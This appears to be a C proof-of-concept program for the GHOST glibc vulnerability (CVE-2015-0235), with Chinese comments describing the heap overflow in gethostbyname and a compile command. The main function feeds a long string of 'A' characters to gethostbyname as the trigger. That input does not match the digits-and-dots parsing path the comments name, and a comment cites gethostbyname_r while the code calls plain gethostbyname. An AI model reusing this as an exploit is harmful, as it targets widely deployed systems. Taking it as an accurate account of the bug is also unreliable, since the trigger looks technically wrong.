/* CVE-2015-0235 — GHOST (glibc gethostbyname heap overflow)
 * 漏洞: __nss_hostname_digits_dots 中 realloc 后缓冲区大小计算错误
 * 编译: gcc -o ghost ghost.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#define BUF_SIZE 1024

void vulnerable_parse(char *hostname) {
    struct hostent *he;
    /* BUG: glibc < 2.18 gethostbyname_r 内部realloc计算错误 */
    he = gethostbyname(hostname);
    if (he) printf("resolved: %s\n", he->h_name);
}

int main(int argc, char **argv) {
    char buf[BUF_SIZE];
    if (argc > 1) {
        /* 超长hostname触发内部heap overflow */
        memset(buf, 'A', BUF_SIZE-1);
        buf[BUF_SIZE-1] = '\0';
        vulnerable_parse(buf);
    }
    return 0;
}
